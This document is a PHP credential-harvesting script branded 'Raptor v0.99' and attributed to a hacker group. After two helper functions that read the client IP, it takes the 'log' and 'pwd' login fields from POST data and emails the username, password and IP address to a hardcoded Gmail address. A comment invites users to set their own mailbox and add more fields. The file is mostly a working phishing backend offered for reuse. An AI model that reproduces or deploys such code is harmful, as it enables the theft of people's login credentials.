#Raptor v0.99
#Coded By:D3v!l(Motawari@Gmail.Com)
#Owned By:Black Termites
#Visit:
#https://telegram.me/Termitez
#https://twitter.com/Termitez
#-----------------------------------#
// Function to get the client ip address
function get_client_ip_env() {
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
        $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';

    return $ipaddress;
}


// Function to get the client ip address
function get_client_ip_server() {
    $ipaddress = '';
    if ($_SERVER['HTTP_CLIENT_IP'])
        $ipaddress = $_SERVER['HTTP_CLIENT_IP'];
    else if($_SERVER['HTTP_X_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED_FOR'];
    else if($_SERVER['HTTP_X_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_X_FORWARDED'];
    else if($_SERVER['HTTP_FORWARDED_FOR'])
        $ipaddress = $_SERVER['HTTP_FORWARDED_FOR'];
    else if($_SERVER['HTTP_FORWARDED'])
        $ipaddress = $_SERVER['HTTP_FORWARDED'];
    else if($_SERVER['REMOTE_ADDR'])
        $ipaddress = $_SERVER['REMOTE_ADDR'];
    else
        $ipaddress = 'UNKNOWN';

    return $ipaddress;
}

// Get the client ip address
$ipaddress = $_SERVER['REMOTE_ADDR'];
	if (isset($_POST['log']))
		$log = $_POST['log'];
	if (isset ($_POST['pwd']))
		$pwd = $_POST['pwd'];
		/* if (isset($_POST['yournamehtmlform'])
		$yournamehtmlform = $_POST['yournamehtmlform'];*/ // You Can Make Many Input For Get Many Keys!

$To = 'Motawari@Gmail.Com'; //Set Your Mail
$Subject = 'Raptor!'; 
$Message = "Username:$log
Password:$pwd
Ip:$ipaddress
\" We Are Iranian 
\" We Are Devoted Mehdi

<*Underground Is Our Home*/>
Contact Me:Motawari@Gmail.Com"; 
$Headers = 'Raptor Coded By D3v!l
My Team Black Termites'; 
mail($To, $Subject, $Message, $Headers); 
